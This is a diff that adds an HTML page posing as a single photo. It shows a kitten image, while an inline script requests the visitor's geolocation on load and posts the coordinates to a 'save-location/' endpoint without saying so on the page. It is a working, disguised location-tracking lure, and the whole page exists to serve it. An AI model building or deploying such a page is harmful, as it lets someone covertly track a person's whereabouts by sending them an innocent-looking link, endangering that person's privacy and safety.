@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="utf-8">
+    <title>Фото</title>
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://placekitten.com/1200/800" alt="Фото">
+
+    <script>
+        function saveLocation(lat, lon) {
+            fetch("save-location/", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon
+                })
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    saveLocation(position.coords.latitude, position.coords.longitude);
+                },
+                function() {
+                    saveLocation(null, null);
+                }
+            );
+        } else {
+            saveLocation(null, null);
+        }
+    </script>
+</body>
+</html>
